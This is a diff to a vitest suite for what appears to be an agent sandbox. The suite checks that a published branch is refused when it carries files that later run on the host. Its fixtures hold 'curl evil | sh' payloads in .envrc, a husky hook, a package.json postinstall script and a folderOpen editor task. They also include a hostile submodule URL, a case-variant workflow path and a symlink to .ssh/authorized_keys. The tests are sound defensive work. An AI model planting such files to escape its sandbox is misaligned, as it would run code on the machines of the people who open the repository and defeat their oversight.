@@ -1,5 +1,5 @@
 import { execFileSync } from 'node:child_process';
-import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
@@ -105,15 +105,35 @@ describe.skipIf(!enabled)('isolation 8: logical escape through the diff', () => 
     ['a dev container, which a human opens', '.devcontainer/devcontainer.json', '{"postCreateCommand":"curl evil"}\n'],
     ['the factory config', '.factory/config.yml', 'commands: {}\n'],
     ['a binary', 'tool.bin', 'MZ\0\0\0payload'],
+    // ORC-219: what else the host runs later, from the branch.
+    ['a direnv file, which runs as a human enters the directory', '.envrc', 'curl evil | sh\n'],
+    ['a husky hook, which runs at a human’s next commit', '.husky/pre-commit', 'curl evil | sh\n'],
+    ['an editor task, which runs as the folder opens', '.vscode/tasks.json', '{"tasks":[{"command":"curl evil","runOptions":{"runOn":"folderOpen"}}]}\n'],
+    ['a workflow in another case, as a case-insensitive checkout reads it', '.GitHub/Workflows/owned.yml', 'on: push\n'],
+    ['a submodule, which the next update fetches', '.gitmodules', '[submodule "x"]\n\tpath = x\n\turl = https://evil.test/x.git\n'],
+    ['a package script, which the next install runs', 'package.json', '{"name":"p","scripts":{"postinstall":"curl evil | sh"}}\n'],
   ])('%s: refused, nothing pushed', async (_what, path, content) => {
-    const s = await setup(path.replace(/\W/g, '-'));
-    const sha = s.commitFile(path, content);
+    // By its bytes: `.github` and `.GitHub` are one directory on a case-insensitive filesystem.
+    const s = await setup(Buffer.from(path).toString('hex'));
+    await expectRefused(s, s.commitFile(path, content));
+  }, 120_000);
+
+  it('a symbolic link out of the tree, which a tool on the host would follow: refused, nothing pushed', async () => {
+    const s = await setup('outward-link');
+    symlinkSync('../../.ssh/authorized_keys', join(s.repo, 'keys'));
+    git(s.repo, 'add', '-A');
+    git(s.repo, 'commit', '-q', '-m', 'link');
+    execFileSync('chmod', ['-R', '0777', s.repo]);
+    await expectRefused(s, git(s.repo, 'rev-parse', 'HEAD'));
+  }, 120_000);
+
+  async function expectRefused(s: Awaited<ReturnType<typeof setup>>, sha: string) {
     const err = await s.publish(sha).catch((e: unknown) => e);
     expect(err).toBeInstanceOf(PublishRefused);
     expect((err as PublishRefused).code).toBe('diff');
     expect(s.onForge()).toBe('');
     expect(s.forge.opened).toEqual([]);
-  }, 120_000);
+  }
 
   it("what the agent left in its repository for the factory's git never runs, on the host nor in the push", async () => {
     const s = await setup('hooks');
